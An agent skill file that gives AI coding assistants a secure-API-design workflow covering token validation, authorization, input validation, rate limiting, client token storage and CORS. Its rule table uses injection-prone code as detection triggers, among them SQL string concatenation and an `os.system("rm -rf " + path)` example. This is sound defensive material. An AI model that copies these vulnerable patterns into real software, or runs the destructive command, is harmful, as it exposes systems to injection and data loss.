---
name: secure-api-design
description: Use when designing or reviewing the security of a REST, GraphQL, or gRPC API; when implementing OAuth2 token validation, API key management, or mTLS for service-to-service authentication; when hardening API endpoints against OWASP API Security Top 10 vulnerabilities (broken auth, excessive data exposure, mass assignment, injection); when implementing rate limiting, throttling, and DoS protection at the API gateway layer; when securing API clients (SPAs, mobile apps, native clients) with proper token storage, BFF patterns, and CSP headers; when designing multi-tenant API authorization (RBAC/ABAC/ReBAC at the resource level); or when responding to an API security incident (credential stuffing, token leakage, API abuse). Handles REST/GraphQL/gRPC authentication patterns (JWT validation, JWKS rotation, opaque token introspection, API key hashing and scanning, mTLS, HMAC request signing), authorization enforcement at the API layer (OPA/Rego policy-as-code, resource-level permissions with OpenFGA/Cedar, middleware-based RBAC/ABAC for multi-tenant APIs), input validation hardening (JSON Schema allowlist validation, GraphQL query cost/depth limiting, protobuf validator chains, mass assignment protection with explicit field allowlists), injection defense (parameterized queries with ORM escape hatch auditing, NoSQL injection detection, SSTI prevention in Go/Node/Python template engines), rate limiting architecture (distributed token bucket with Redis, endpoint-tier throttling, GraphQL cost analysis, gRPC flow control), CSRF/CORS hardening (SameSite=Strict/Lax, double-submit cookie, Origin header validation, preflight configuration), client-side token security (httpOnly cookies over localStorage, BFF pattern implementation, token refresh in secure contexts, CSP+SRI for API-driven apps), API error handling security (standardized error format, no stack traces/DB errors/internal IPs, secure defaults for unhandled exceptions), and API security observability (structured audit logging with who/what/when/from/result, credential stuffing detection via rate anomaly, API honeytokens for intrusion detection). Do NOT use for IAM architecture design (route to iam-architect), cloud API gateway configuration (route to cloud-security), general API design without security focus (route to api-designer), or OAuth2 provider implementation (route to backend-developer with security-reviewer).
author: Sandeep Kumar Penchala
license: MIT
portability: works with Claude Code, Copilot CLI, Cursor, OpenClaw, Gemini CLI
type: security
status: stable
version: 1.0.0
updated: 2026-07-23
tags: [security, api-security, oauth2, jwt, rate-limiting, cors, csrf, injection-prevention, input-validation, authorization]
token_budget: 4500
chain:
  consumes_from: []
  feeds_into: []
  alternatives: []
---

# Secure API Design
> **Portability target:** Spec-level (runs on Claude Code, Copilot CLI, Cursor, OpenClaw, Gemini CLI). No vendor-specific frontmatter fields.

End-to-end API security design and hardening — from authentication strategy through runtime observability. Covers REST, GraphQL, and gRPC APIs across all OWASP API Security Top 10 categories. Focus on defense-in-depth, least-privilege authorization, and cryptographic best practices for production API security — no checklists without context, no security theater, no bypassable controls.

## Ground Rules — Read Before Anything Else

These rules are non-negotiable constraints that detect dangerous API security patterns before code is written or reviewed. Violation means STOP and refuse to proceed.

| # | Negative Constraint | Mechanical Trigger | Violation Response |
|---|-------------------|-------------------|-------------------|
| R1 | REFUSE to expose stack traces, internal errors, or system details in API error responses. Attackers use error messages to fingerprint frameworks, infer database schemas, and plan injection attacks. | Trigger: response body contains `stack trace`, `SQLException`, `ORA-`, `PostgreSQL`, `mongodb`, `at `, `File "`, `line `, OR internal IP/hostname (192.168., 10., 172.16-31.) in error output | STOP. Respond: "API error responses must never expose internal details. Return a standardized error envelope: `{"error":{"code":"RESOURCE_NOT_FOUND","message":"The requested resource was not found","request_id":"uuid"}}`. Log the full stack trace server-side only, correlated by request_id. This prevents framework fingerprinting, database schema inference, and information leakage via error oracle attacks." |
| R2 | REFUSE to use `Access-Control-Allow-Origin: *` with credentialed requests (`withCredentials: true`, cookies, Authorization headers). Browser spec explicitly forbids the combination, and misconfiguration creates CSRF exposure. | Trigger: CORS configuration contains `Access-Control-Allow-Origin: *` AND response includes credentials (cookies, Authorization header, `Access-Control-Allow-Credentials: true`) | STOP. Respond: "The CORS spec (Fetch Standard §3.2.5) prohibits wildcard origins with credentials. When `Access-Control-Allow-Credentials: true` is set, `Access-Control-Allow-Origin` MUST be an explicit, validated origin — never `*`. Implement a server-side allowlist: validate the `Origin` request header against a configured list of trusted origins, and reflect it back ONLY if it matches. Never reflect arbitrary origins." |
| R3 | REFUSE to store access tokens or refresh tokens in localStorage or sessionStorage for SPA applications. XSS can read these synchronously — a single DOM-based XSS vulnerability compromises all tokens. | Trigger: storage recommendation mentions `localStorage.setItem("access_token"`, `sessionStorage.getItem("token"`, OR token stored in browser storage for a single-page app with no BFF | STOP. Respond: "Access tokens stored in localStorage are readable by any JavaScript running on the origin — a single XSS vulnerability exfiltrates all tokens. Use httpOnly, Secure, SameSite=Strict cookies for session tokens, or implement a Backend-for-Frontend (BFF) pattern where the BFF holds tokens server-side and issues a session cookie to the SPA. If tokens MUST be in-memory in the SPA (not recommended), use a closure variable with a short-lived access token (5 min) and refresh via the BFF." |
| R4 | DETECT when user input is concatenated into SQL, NoSQL, LDAP, or OS commands. Parameterized queries are the only acceptable pattern — any string concatenation into a query is a code vulnerability. | Trigger: code contains string interpolation into a query — `"SELECT * FROM users WHERE id = '" + userId + "'"`, f-strings in SQL (`f"SELECT * FROM {table}"`), `db.collection.find({ "$where": userInput })`, OR `os.system("rm -rf " + path)` | STOP. Respond: "String concatenation into SQL/NoSQL/OS commands is a SQL injection or command injection vector. Use parameterized queries: `db.query('SELECT * FROM users WHERE id = $1', [userId])`. For dynamic table/column names (rarely needed), use an allowlist: `ALLOWED_TABLES = {'users', 'orders'}; table = ALLOWED_TABLES.get(user_input)`. ORMs are not a silver bullet — native query methods and `$where` in MongoDB bypass ORM protections." |
| R5 | REFUSE to trust client-side validation as a security control. Client-side validation is a UX convenience — attackers bypass it trivially with curl, Postman, or by modifying JavaScript in DevTools. | Trigger: validation logic exists ONLY in frontend code (React form validation, HTML5 `required` attributes, JavaScript length checks) AND there is no corresponding server-side validation for the same fields | STOP. Respond: "Client-side validation is trivially bypassed by sending requests directly to the API via curl, Postman, or browser DevTools. Every input must be validated server-side using JSON Schema allowlist validation, type checking, length constraints, and format validation. Add server-side validation: validate Content-Type, enforce schema with AJV/JSON Schema, check field types and ranges, strip unknown fields (mass assignment protection). Client-side validation remains for UX only." |
| R6 | DETECT when authentication endpoints lack aggressive rate limiting. Auth endpoints are the highest-value target for credential stuffing, brute force, and enumeration attacks — they need the strictest limits. | Trigger: rate limiting configuration shows auth endpoints (`/login`, `/auth/token`, `/oauth/authorize`, `/api/v1/auth`) have the SAME or looser rate limits than general API endpoints | STOP. Respond: "Authentication endpoints are the most targeted API surface. Apply strict per-IP AND per-account rate limiting: 5 failed attempts per account per 15 minutes, 20 attempts per IP per minute. Use exponential backoff on repeated failures (1s → 2s → 4s → 8s → 16s), then lock the account for 15 minutes. Return identical error messages for 'invalid username' and 'invalid password' to prevent user enumeration. Monitor for credential stuffing patterns (high failure rate across many accounts from single IP)." |
| R7 | DETECT when API endpoints lack per-resource authorization — ANY authenticated user can access ANY resource of that type by changing an ID parameter. This is BOLA (Broken Object Level Authorization, OWASP API1:2023) — the #1 API vulnerability by both frequency and impact. | Trigger: `grep -r "\.get\(\|\.find\(\|\.findOne\(\|\.query\(" --include="*.ts" --include="*.js" --include="*.py" --include="*.go" -A2 | grep -v "user_id\|owner_id\|tenant_id\|userId\|ownerId\|tenantId\|WHERE.*user_id\|WHERE.*owner_id"` — resource access without ownership verification AND endpoint path contains a resource ID parameter (`/users/:id`, `/orders/:uuid`, `/api/v1/documents/{docId}`) | STOP. Respond: "Broken Object Level Authorization (BOLA/IDOR) is OWASP API Top 10 #1 — the most common and impactful API vulnerability. Every endpoint that accesses a resource by ID MUST verify that the authenticated user owns that resource OR has explicit permission to access it. Pattern: `const resource = await db.resources.findById(req.params.id); if (resource.owner_id !== req.user.id) return 403;`. For multi-tenant: `if (resource.tenant_id !== req.user.tenant_id) return 403;`. BOLA is silent — HTTP 200, no error, no alert. It is detectable only through systematic authorization testing, not through logs." |

## The Expert's Mindset

You are an API security architect who thinks like an attacker and designs like a defender. Your mental model:

*   **Authorization is the #1 API vulnerability class — not injection.** OWASP API Security Top 10:2023 confirms it: API1 (Broken Object Level Authorization), API2 (Broken Authentication), and API3 (Broken Object Property Level Authorization) are ALL authorization failures. Injection (API8) ranks lower. Most teams over-invest in WAFs and under-invest in resource-level authorization. A valid JWT proves identity — it proves nothing about what data that identity can access. BOLA (IDOR) is the silent killer: user A's valid token accessing user B's resource returns HTTP 200, not 403. There is no error to detect.
*   **The API is the perimeter.** In modern architectures — SPAs, mobile apps, microservices — the API is the attack surface. There is no network perimeter. Every endpoint is an entry point, and every parameter is a potential weapon.
*   **Anti-rationalization: three illusions that cause breaches.** (1) **Checkbox compliance:** "We passed the pentest" is not security — it means you passed one assessment on one day. Attackers iterate; your defenses must too. (2) **Tool-completeness illusion:** Deploying a WAF, API gateway, and SAST scanner does not make you secure — misconfigurations in ANY of these tools create bypasses. Tools are only as effective as their configuration and the humans operating them. (3) **Perimeter fixation:** Thinking the API gateway is the security boundary ignores that most breaches come from valid credentials on valid endpoints accessing data they shouldn't. Authorization must be enforced at the resource-instance level, not the perimeter.
*   **Fail closed, never open.** Every security control — authentication, authorization, rate limiting, input validation — must deny by default. An unhandled error, a missing policy, or a misconfigured middleware must result in a 403, not a pass-through.
*   **Defense in depth means layers that fail independently.** A WAF does not replace input validation. CORS does not replace CSRF tokens. API keys do not replace OAuth2. Each layer must provide meaningful protection even if the layer above it is bypassed.
*   **Observability is a security control.** If you cannot answer "who accessed what, when, from where, and with what result" for every API call in the last 90 days, you are not secure — you are lucky. Structured audit logs are as critical as TLS. Without them, BOLA attacks are invisible.

## Operating at Different Levels

*   **Quick scan (30s):** Check auth configuration (JWT algorithm pinned? Token expiry ≤ 15 min?), CORS headers (no wildcard with credentials?), error response format (no stack traces?), TLS config (minimum TLS 1.2, HSTS header present?). Flag any OWASP API Security Top 10 violations visible from response inspection.
*   **Security review (10min):** Review auth flow end-to-end (token issuance, validation, refresh, revocation). Verify authorization middleware covers all endpoints. Check input validation approach (allowlist vs denylist). Review rate limiting configuration per endpoint tier. Audit CORS and CSRF setup. Identify top 3 highest-risk endpoints.
*   **Deep hardening (full session):** Full API security architecture review: authentication strategy (JWT vs opaque, key rotation schedule), authorization model (RBAC/ABAC/ReBAC with policy-as-code), input validation framework (JSON Schema, protobuf validators), injection defense across all data stores, rate limiting architecture (distributed token bucket with Redis), client-side token security (BFF pattern, CSP, SRI), error handling standardization, and security observability (audit logging schema, honeytokens, alert thresholds).
*   **Incident response mode (token leakage, credential stuffing, API abuse):** Triage: rotate all compromised keys/tokens immediately, identify affected users via audit logs, block attacker IPs/patterns at the gateway, notify affected users, implement additional rate limiting, deploy honeytokens to detect ongoing abuse, conduct root cause analysis. Goal is containment within minutes, eradication within hours.

## When to Use

Use secure-api-design when designing, building, or reviewing API security — from greenfield design through production hardening and incident response.

*   Designing authentication for a new API: JWT vs opaque tokens, OAuth2 grant selection, API key architecture, mTLS for service-to-service
*   Implementing authorization: RBAC vs ABAC vs ReBAC, policy-as-code with OPA/Rego, resource-level permissions with OpenFGA/Cedar
*   Hardening input validation: JSON Schema allowlists, GraphQL cost/depth limiting, protobuf validators, mass assignment protection
*   Defending against injection: SQL/NoSQL/LDAP/command injection, SSTI in template engines, GraphQL injection vectors
*   Architecting rate limiting: distributed token bucket with Redis, endpoint-tier throttling, GraphQL cost analysis, gRPC flow control
*   Configuring CORS and CSRF defenses: SameSite cookies, double-submit cookie, Origin header validation, preflight handling
*   Securing API clients: httpOnly Secure cookies, BFF pattern for SPAs, token refresh strategies, CSP and SRI for API-driven apps
*   Standardizing API error handling: no stack traces, no DB errors, no internal IPs, secure defaults for unhandled exceptions
*   Building API security observability: structured audit logging, credential stuffing detection, honeytokens, alerting thresholds
*   Responding to API security incidents: token leakage containment, credential stuffing response, API abuse triage

Do NOT use for IAM architecture design (route to iam-architect). Do NOT use for cloud API gateway configuration (route to cloud-security). Do NOT use for general API design without security focus (route to api-designer). Do NOT use for OAuth2 provider implementation (route to backend-developer with security-reviewer).

## Route the Request

### Auto-Route by Artifacts (Check Filesystem First)

| # | Condition | Action |
|---|-----------|--------|
| A1 | `file_contains("*.yaml\|*.yml\|*.json", "openapi:\|swagger:\|paths:\|/api/")` | OpenAPI spec detected —> Go to **Core Workflow: Phase 3 — Input Validation & Injection Defense** |
| A2 | `file_contains("*.yaml\|*.yml\|*.json", "securitySchemes:\|bearerAuth:\|oauth2:\|apiKey:")` | Auth configuration in spec —> Jump to **Decision Trees: OAuth2 Token Strategy** |
| A3 | `file_contains("*.go\|*.ts\|*.py\|*.js", "jwt\.\|JWT\|jsonwebtoken\|jose\|pyjwt")` | JWT code present —> Go to **Core Workflow: Phase 1 — Authentication Hardening** |
| A4 | `file_contains("*.go\|*.ts\|*.py\|*.js", "cors\(\)\|Access-Control\|CORS\|@CrossOrigin")` | CORS configuration found —> Jump to **Decision Trees: CORS Policy Design** |
| A5 | `file_contains("*.go\|*.ts\|*.py\|*.js", "rate.limit\|throttle\|rateLimit\|RateLimiter")` | Rate limiting code —> Jump to **Decision Trees: Rate Limiting Architecture** |
| A6 | `file_contains("*.graphql\|*.gql", "type\|query\|mutation\|schema")` | GraphQL schema present —> Jump to **Decision Trees: GraphQL Security Hardening** |
| A7 | No API security files found | New API security design —> Go to **Core Workflow: Phase 1** |

### Intent Route (Ask the User)

```
What API security task are you working on?
|-- Designing auth for a new API -> Start at "Core Workflow: Phase 1"
|-- Hardening an existing API against OWASP Top 10 -> Go to "Core Workflow: Phase 2"
|-- Configuring CORS correctly -> Jump to "Decision Trees: CORS Policy Design"
|-- Choosing JWT vs opaque tokens -> Jump to "Decision Trees: OAuth2 Token Strategy"
|-- Implementing API key management -> Jump to "Decision Trees: API Key Management Strategy"
|-- Architecting rate limiting -> Jump to "Decision Trees: Rate Limiting Architecture"
|-- Hardening a GraphQL API -> Jump to "Decision Trees: GraphQL Security Hardening"
|-- Responding to an API security incident -> Go to "Operating at Different Levels: Incident response mode"
|-- Comprehensive API security review -> Start at "Core Workflow: Phase 1"
```

## Core Workflow

### Phase 1: Authentication Hardening

Execute in order. Do not skip steps.

```
1. AUDIT CURRENT AUTHENTICATION
   |-- Identify all auth mechanisms: JWT, opaque tokens, API keys, mTLS, session cookies, Basic auth
   |-- Document token lifecycles: issuance, validation, refresh, revocation for each mechanism
   |-- Check token storage: NEVER localStorage for SPAs, use httpOnly Secure SameSite cookies or BFF pattern
   |-- Verify TLS: minimum TLS 1.2, HSTS header (max-age=31536000; includeSubDomains; preload)

2. HARDEN JWT CONFIGURATION (if JWT is used)
   |-- Pin the signing algorithm in validation: `algorithms: ['RS256']` — never accept `alg: "none"`
   |-- Set short expiry: access token ≤ 15 minutes, refresh token ≤ 7 days (with rotation)
   |-- Validate ALL standard claims:
   |   |-- `exp` (expiration): reject if expired, with clock skew tolerance ≤ 30 seconds
   |   |-- `nbf` (not before): reject if not yet valid
   |   |-- `iss` (issuer): must match expected issuer exactly (string comparison)
   |   |-- `aud` (audience): must contain this API's client_id
   |   |-- `sub` (subject): must be present and non-empty
   |-- Implement JWKS endpoint with key rotation: publish public keys at `/.well-known/jwks.json`
   |-- Rotate signing keys every 90 days; maintain max 2 active keys during rotation window

3. HARDEN OPAQUE TOKEN CONFIGURATION (if opaque tokens are used)
   |-- Use `/introspect` endpoint (RFC 7662) for token validation on every request
   |-- Cache introspection responses with TTL = token expiry - current time, max 60 seconds
   |-- Fail closed: if introspection endpoint is unreachable, DENY the request (never fall through)
   |-- Token entropy ≥ 128 bits (cryptographically secure random — not UUIDv4, not timestamp-based)

4. HARDEN API KEY CONFIGURATION
   |-- Generate keys with ≥ 128 bits of entropy from `secrets.token_urlsafe()`
   |-- Store ONLY SHA-256 hash of the key in the database (never plaintext)
   |-- Expose a prefix for identification: `sk_live_abc123...` where `abc123` is the first 8 chars
   |-- Allow clients to list/rotate/revoke keys; rate limit key creation to 10/day per account
   |-- Scan for leaked keys: integrate GitHub secret scanning regex patterns for your key format

5. IMPLEMENT mTLS (if service-to-service)
   |-- Issue client certificates from a private CA (not public CA — use cert-manager, step-ca, or Vault PKI)
   |-- Validate client cert on every request: check CN/SAN, verify not revoked (CRL or OCSP), check expiry
   |-- Rotate certificates every 30-90 days; automate renewal with cert-manager or similar
   |-- Combine mTLS with token-based auth for defense-in-depth: mTLS proves the service identity, token proves the end-user identity
```

### Phase 2: Authorization Architecture

```
1. MAP THE AUTHORIZATION MODEL
   |-- RBAC (Role-Based): User -> Role -> Permissions. Best for: simple hierarchies, fixed role sets (<20 roles)
   |-- ABAC (Attribute-Based): Subject attributes + Resource attributes + Environment -> Decision
   |   |-- Best for: complex policies, multi-tenant, dynamic conditions (time, location, risk score)
   |   |-- Implementation: OPA/Rego policy-as-code, AWS Verified Permissions/Cedar, OpenFGA
   |-- ReBAC (Relationship-Based): User --[relation]--> Resource. Best for: social graphs, org hierarchies, document sharing
   |   |-- Implementation: OpenFGA (Zanzibar-based), SpiceDB, Google Zanzibar

2. ENFORCE AT THE RIGHT LAYER
   |-- API Gateway: coarse-grained (route-level: /admin/* requires admin role). 1ms overhead.
   |-- Middleware: resource-type-level (GET /users/* requires users:read). 5ms overhead.
   |-- Application/Policy Engine: resource-instance-level (user 123 can edit document 456 if owner). 10-50ms overhead.
   |-- NEVER enforce authorization exclusively at the gateway — it creates a hard shell with a soft interior

3. IMPLEMENT POLICY-AS-CODE (OPA/Rego Example Pattern)
   |-- Write policies in Rego: `allow { input.user.role == "admin" }`
   |-- Bundle policies with the application (CI/CD artifact, version-controlled)
   |-- Decision log: log every policy evaluation result (allow/deny) with input context for audit
   |-- Test policies like code: `opa test policies/` in CI pipeline

4. MULTI-TENANCY AUTHORIZATION
   |-- Tenant isolation: every query includes `WHERE tenant_id = $current_tenant`
   |-- Never rely on URL path for tenant resolution (attacker can manipulate `/api/tenant-a/users`)
   |-- Resolve tenant from authenticated context (JWT claim, API key metadata — never from request body or URL)
   |-- Cross-tenant access detection: alert on any access where tenant_id differs from token's tenant claim

5. PERMISSION MODEL VERIFICATION
   |-- For every endpoint, answer: "Who can call this? Under what conditions? What data scope?"
   |-- Test with unauthorized tokens (wrong role, wrong tenant, expired, tampered)
   |-- Test with no token, malformed token, token signed with wrong key
   |-- Verify that deleting a user cascades to revoke all their active tokens/sessions
```

### Phase 3: Input Validation & Injection Defense

```
1. IMPLEMENT ALLOWLIST VALIDATION (NEVER DENYLIST)
   |-- JSON Schema / OpenAPI: define exact shape, types, lengths, formats, enum values, patterns
   |-- Reject unknown fields: strip or 400 on any field not in the schema (mass assignment protection)
   |-- Validate at the edge: before any business logic, before any database query
   |-- Framework integration: AJV (Node.js), pydantic (Python), go-playground/validator (Go), class-validator (NestJS)

2. GRAPHQL-SPECIFIC VALIDATION
   |-- Query depth limiting: max depth 5-7 (prevent deeply nested queries like `{user{posts{comments{user{posts{...}}}}}}`)
   |-- Query cost analysis: assign cost weights (scalar=1, object=2, connection=5, each additional item=1)
   |-- Reject queries exceeding cost threshold (e.g., 1000 points) BEFORE execution
   |-- Pagination: enforce `first`/`last` limits (max 100), reject unbounded queries
   |-- Disable introspection in production OR restrict to authenticated admin role

3. gRPC-SPECIFIC VALIDATION
   |-- Protobuf validators: `buf/validate` with field constraints (string.min_len, int32.gte, pattern)
   |-- Validate at service entry point AND at each downstream service (zero-trust inside mesh)
   |-- Use interceptors for cross-cutting validation (auth, logging, rate limiting) on every RPC

4. INJECTION DEFENSE — AUDIT ESCAPE HATCHES
   |-- SQL: parameterized queries 100% — `db.query('SELECT * FROM users WHERE id = $1', [id])`
   |   |-- Audit all ORM "raw" or "native" query methods: `sequelize.query()`, `prisma.$queryRaw`, `gorm.DB.Raw()`
   |   |-- Dynamic ORDER BY / GROUP BY: allowlist of valid column names, reject anything else
   |-- NoSQL: MongoDB `$where`, `$eval`, `mapReduce` are injection vectors — audit and eliminate
   |   |-- Use `$eq` operator — `db.users.find({username: {$eq: userInput}})` — never pass user input as query operators
   |-- SSTI (Server-Side Template Injection): audit all template engines
   |   |-- Go `html/template`: auto-escapes (safe by default) — NEVER use `text/template` for HTML
   |   |-- Jinja2/Django: disable `autoescape=False`, never pass user input to `render_template_string()`
   |   |-- EJS/Pug/Handlebars: use `#{` escaped interpolation, not `!{` unescaped
   |-- Command injection: NEVER `os.system(user_input)` or `child_process.exec(user_input)`
   |   |-- Use `child_process.execFile()` or `subprocess.run([cmd, arg1, arg2])` with argument arrays
   |-- LDAP injection: escape special chars `*\()&|` in user input before LDAP filter construction

5. CONTENT-TYPE ENFORCEMENT
   |-- Reject requests with unexpected Content-Type (e.g., text/html to a JSON endpoint)
   |-- Validate that body actually parses as the claimed Content-Type
   |-- Set `X-Content-Type-Options: nosniff` response header
```

### Phase 4: Rate Limiting & DoS Protection

```
1. ARCHITECT DISTRIBUTED RATE LIMITING
   |-- Token bucket algorithm: tokens refill at rate R, bucket capacity B (allows bursts)
   |-- Store bucket state in Redis with Lua scripts for atomicity (GET + DECR in one operation)
   |-- Key composition: `ratelimit:{endpoint_tier}:{identifier}:{window}` where identifier = user_id OR IP
   |-- Multi-window: implement concurrent 1-second, 1-minute, and 1-hour windows

2. DEFINE ENDPOINT TIERS
   |-- Tier 0 — Auth endpoints (/login, /token, /mfa): 5 req/min per IP, 3 req/min per account
   |-- Tier 1 — Sensitive (/users/*, /admin/*, /billing/*): 60 req/min per user
   |-- Tier 2 — Standard (CRUD operations): 300 req/min per user
   |-- Tier 3 — Public/read-only (GET /products, GET /catalog): 1000 req/min per IP
   |-- Health checks (/health, /ready): exempt from rate limiting, but firewall to internal IPs only

3. GRAPHQL COST ANALYSIS
   |-- Pre-execution cost estimation: parse query AST, calculate cost, reject if > threshold
   |-- Cost formula: cost = Σ(object_weight × estimated_items × nesting_depth_multiplier)
   |-- Typical thresholds: max cost 1000 per query, max depth 7, max aliases 20
   |-- Track per-user query cost over time; detect anomalous query patterns (cost spikes)

4. gRPC FLOW CONTROL
   |-- Max concurrent streams per connection: 100 (HTTP/2 SETTINGS_MAX_CONCURRENT_STREAMS)
   |-- Max message size: 4MB default (configure via gRPC MaxRecvMsgSize/MaxSendMsgSize)
   |-- Keepalive: enforce min ping interval (5 min), enforce max connection age (1 hour) with graceful shutdown
   |-- Rate limit per method: use gRPC interceptors with token bucket per RPC method path

5. DoS-SPECIFIC DEFENSES
   |-- Request body size limit: 1MB for JSON, 10MB for file uploads (configure at reverse proxy)
   |-- Connection timeout: 30s for API, 5s for health checks
   |-- Slowloris defense: minimum request rate (reject connections sending < 1 byte/sec after 10s)
   |-- IP reputation: integrate with abuse IP databases; auto-block known malicious IPs
```

### Phase 5: Client-Side Token Security

```
1. SPA TOKEN STORAGE — THE BFF PATTERN
   |-- Problem: SPAs cannot securely store tokens; localStorage is XSS-readable, no secure persistence in JS
   |-- Solution: Backend-for-Frontend (BFF):
   |   |-- BFF holds OAuth2 tokens server-side in a session store (Redis)
   |   |-- BFF issues a httpOnly, Secure, SameSite=Strict session cookie to the SPA
   |   |-- SPA calls BFF, BFF proxies to API with the real token — token never reaches the browser
   |   |-- Token refresh: BFF handles refresh transparently; SPA never sees a refresh token
   |-- If BFF is not feasible (legacy constraint):
   |   |-- Store access token in a closure variable (not window.__TOKEN, not Redux store)
   |   |-- Use Service Worker for token refresh: intercept 401, call /refresh via SW, retry request
   |   |-- Access token lifetime: absolute maximum 5 minutes (browser memory is volatile anyway)

2. MOBILE APP TOKEN STORAGE
   |-- iOS: store tokens in Keychain with `kSecAttrAccessibleWhenUnlockedThisDeviceOnly`
   |-- Android: store tokens in EncryptedSharedPreferences or Android Keystore (API 23+)
   |-- Never store tokens in UserDefaults (iOS), plain SharedPreferences (Android), or SQLite without encryption
   |-- Use device attestation (SafetyNet/Play Integrity, DeviceCheck) to detect rooted/jailbroken devices
   |-- Bind tokens to device: include device fingerprint hash in token claims; reject if device changes

3. CSP — CONTENT SECURITY POLICY FOR API-DRIVEN APPS
   |-- `default-src 'self'` — block all third-party resources by default
   |-- `script-src 'self'` — no inline scripts, no eval(). Use nonce or hash for any necessary inline scripts
   |-- `connect-src 'self' https://api.example.com` — restrict which origins the app can call
   |-- `frame-ancestors 'none'` — prevent clickjacking of the SPA
   |-- Report-only mode first: `Content-Security-Policy-Report-Only` with `report-uri /csp-report`
   |-- Monitor CSP violation reports — they indicate XSS attempts or misconfiguration

4. SRI — SUBRESOURCE INTEGRITY
   |-- For any third-party script loaded by the SPA, generate SRI hash: `cat script.js | openssl dgst -sha384 -binary | openssl base64 -A`
   |-- Add `integrity="sha384-..." crossorigin="anonymous"` to `<script>` and `<link>` tags
   |-- If the third-party CDN is compromised, the browser will refuse to load the tampered script
   |-- Note: SRI does NOT protect against first-party compromise — CSP nonce/hash does

5. TOKEN REFRESH IN SECURE CONTEXTS
   |-- Refresh tokens must be stored httpOnly (never accessible to JavaScript)
   |-- Rotate refresh token on every use: issue new refresh token, invalidate old (refresh token rotation)
   |-- Detect refresh token reuse: if a previously-used refresh token is presented, revoke ALL tokens for that user (indicates token theft)
   |-- Require user re-authentication for sensitive operations (password change, email change, MFA enrollment)
```

## Decision Trees

### OAuth2 Token Strategy (JWT vs Opaque)

```
What type of API are you securing?
|-- Internal microservices (same trust domain, low latency requirements)
|   |-- JWT (RS256/ES256): stateless validation, no introspection call needed, lower latency
|   |-- Sign with RS256 (asymmetric) so any service can verify with public key
|   |-- Publish JWKS at internal endpoint; rotate keys every 90 days
|   |-- Token lifetime: 5-15 minutes (short-lived in high-trust environment)
|   |-- CAUTION: JWT revocation is impossible without a denylist — keep tokens short-lived
|-- External/public API (third-party clients, high security requirements)
|   |-- Opaque tokens (RFC 7662 introspection): immediate revocation, no information leakage
|   |-- Token is a random string (≥128 bits entropy); meaning lives in auth server database
|   |-- Every API call introspects the token at auth server (cache responses, fail closed)
|   |-- Token lifetime: 1 hour (or configurable per client)
|   |-- ADVANTAGE: revoke instantly; token reveals nothing about user/permissions if leaked
|-- Mixed (both internal and external consumers)
|   |-- Phantom token approach: gateway receives opaque token, exchanges it for JWT internally
|   |-- Gateway introspects opaque token with auth server; on success, issues short-lived JWT to downstream services
|   |-- Downstream services validate JWT statelessly; gateway handles revocation
|   |-- Best of both: external security + internal performance
|-- JWT Algorithm Selection:
|   |-- RS256/RS512: RSA 2048+ bit keys, widely supported, good for JWKS distribution
|   |-- ES256/ES384: ECDSA P-256/P-384, smaller signatures, faster verification, growing adoption
|   |-- EdDSA (Ed25519): modern, fast, compact, recommended for new implementations
|   |-- HS256: symmetric HMAC — ONLY use for service-to-service where key distribution is solved
|   |-- NEVER: accept `alg: "none"` — always pin expected algorithms in validation library
```

### API Key Management Strategy

```
What is the API key used for?
|-- Client identification (not authentication)
|   |-- Generate: `secrets.token_urlsafe(32)` -> 256-bit key, base64 encoded
|   |-- Store: SHA-256 hash in database. Keep prefix (first 8 chars) in plaintext for display
|   |-- Prefix format: `sk_live_abc123...` where sk_ = type prefix, abc123 = key identifier
|   |-- Transmission: in HTTP header `X-API-Key: sk_live_abc123...`
|   |-- NEVER in URL query parameters (logged in server logs, proxy logs, browser history)
|   |-- Rate limit per key independently of user rate limit
|-- Service-to-service authentication (higher security)
|   |-- Use mTLS instead of API keys — API keys are bearer tokens, stealable
|   |-- If API keys must be used: HMAC request signing
|   |   |-- Client has `access_key_id` (public) and `secret_key` (private, never transmitted)
|   |   |-- Each request: compute HMAC-SHA256(secret_key, canonical_request) -> signature
|   |   |-- Server: look up secret_key by access_key_id, recompute signature, compare (constant-time)
|   |   |-- Include timestamp in signature to prevent replay: reject if |now - timestamp| > 5 minutes
|   |-- Key rotation: support 2 active keys during rotation window (7 days), then deactivate old key
|-- Secret scanning (GitHub, GitLab, public repos)
|   |-- Define a regex pattern for your key format: `sk_live_[a-zA-Z0-9]{32,}`
|   |-- Register with GitHub secret scanning partner program (free for public repos)
|   |-- On detection: auto-revoke the key via webhook, notify user, create incident ticket
|   |-- Pre-commit hook: scan for key patterns before commit — `git-secrets` or `detect-secrets`
```

### CORS Policy Design

```
Is the API called from browser-based clients?
|-- No (server-to-server, mobile apps, IoT) -> CORS is irrelevant. Do not add CORS headers.
|-- Yes (SPAs, browser extensions, embedded widgets)
|   |-- Determine which origins need access:
|   |   |-- Single known origin (e.g., https://app.example.com):
|   |   |   |-- Set `Access-Control-Allow-Origin: https://app.example.com` (explicit, not wildcard)
|   |   |   |-- This is the MOST SECURE CORS configuration
|   |   |-- Multiple known origins (e.g., prod + staging + preview deployments):
|   |   |   |-- Read `Origin` request header
|   |   |   |-- Check against server-side allowlist: `ALLOWED_ORIGINS = {'https://app.example.com', 'https://staging.example.com'}`
|   |   |   |-- If match: reflect the Origin back in `Access-Control-Allow-Origin`
|   |   |   |-- If no match: respond WITHOUT CORS headers (do NOT reflect the origin)
|   |   |   |-- NEVER: dynamically generate origin from request without validation (origin reflection attack)
|   |   |-- Credentialed requests (cookies, Authorization header):
|   |   |   |-- `Access-Control-Allow-Credentials: true`
|   |   |   |-- `Access-Control-Allow-Origin` MUST be explicit — `*` is forbidden by spec with credentials
|   |   |   |-- `Access-Control-Allow-Methods`: only the methods your API actually uses (GET, POST, PUT, DELETE)
|   |   |   |-- `Access-Control-Allow-Headers`: only the headers your API needs (Content-Type, Authorization)
|   |   |   |-- `Access-Control-Max-Age`: 3600 (1 hour) to reduce preflight requests
|   |-- Preflight handling:
|   |   |-- Respond to OPTIONS requests with correct CORS headers
|   |   |-- Return 204 No Content (no body needed for preflight)
|   |   |-- Preflight requests do NOT include cookies — do not require auth for OPTIONS
|   |   |-- Cache preflight responses with `Access-Control-Max-Age` to reduce round-trips
|   |-- Common CORS Misconfigurations (BLOCK THESE):
|   |   |-- `Access-Control-Allow-Origin: *` with credentials -> BROKEN, browser will block
|   |   |-- Reflecting Origin without validation -> allows any origin to access the API
|   |   |-- `Access-Control-Allow-Origin: null` -> allows sandboxed iframes, `file://` origins
